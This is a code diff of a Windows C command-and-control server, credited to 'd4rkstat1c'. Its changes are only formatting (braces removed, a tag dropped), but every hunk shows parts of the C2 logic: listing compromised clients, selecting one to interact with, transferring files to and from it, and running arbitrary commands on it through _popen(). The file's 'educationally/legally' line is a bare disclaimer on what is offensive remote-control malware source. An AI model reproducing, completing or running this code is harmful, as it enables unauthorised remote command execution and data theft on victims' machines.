@@ -1,7 +1,6 @@
 /*
 Coded by d4rkstat1c.
 Use this code educationally/legally.
-#GSH
 */
 #include <WS2tcpip.h>
 #include <stdio.h>
@@ -69,7 +68,6 @@ const SOCKET create_socket() {
 	if (listen_socket == INVALID_SOCKET) {
 		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
 		WSACleanup();
-	
 		exit(1);
 	}
 
@@ -156,9 +154,8 @@ void list_connections(const Conn_map* conns) {
 	printf("---------------------------\n\n");
 
 	if (conns->size) {
-		for (size_t i = 0; i < conns->size; i++) {
+		for (size_t i = 0; i < conns->size; i++)
 			printf("%s: %lu\n", conns->clients[i].host, i);
-		}
 		printf("\n\n");
 	}
 	else {
@@ -200,13 +197,11 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
 		int bytes_read;
 		while (!feof(fd) && i_result > 0) {
-			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
+			if (bytes_read = fread(buf, 1, BUFLEN, fd))
 				// Send file's bytes chunk to remote server.
 				i_result = send(client_socket, buf, bytes_read, 0);
-			}
-			else {
+			else
 				break;
-			}
 		}
 		// Close the file.
 		fclose(fd);
@@ -310,10 +305,9 @@ const func parse_cmd(char* const buf) {
 	// Function pointer array of each c2 command.
 	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
 
-	for (int i = 0; i < 4; i++) {
+	for (int i = 0; i < 4; i++)
 		if (compare(buf, commands[i]))
 			return func_array[i];
-	}
 
 	// If no command was parsed: send/execute the command string on the client via _popen().
 	return &send_cmd;
@@ -430,9 +424,8 @@ int main(void) {
 				TerminateThread(acp_thread, 0);
 				// if there's any connections close them before exiting.
 				if (conns.size) {
-					for (size_t i = 0; i < conns.size; i++) {
+					for (size_t i = 0; i < conns.size; i++)
 						closesocket(conns.clients[i].sock);
-					}
 					// Free allocated memory.
 					free(conns.clients);
 				}
@@ -450,12 +443,10 @@ int main(void) {
 				// Interact with client.
 				int client_id;
 				client_id = atoi(&cmd[9]);
-				if (!conns.size || client_id < 0 || client_id > conns.size - 1) {
+				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
 					printf("Invalid client identifier.\n");
-				}
-				else {
+				else
 					interact(&conns, buf, client_id);
-				}
 			}
 			else {
 				// Execute command on host system.
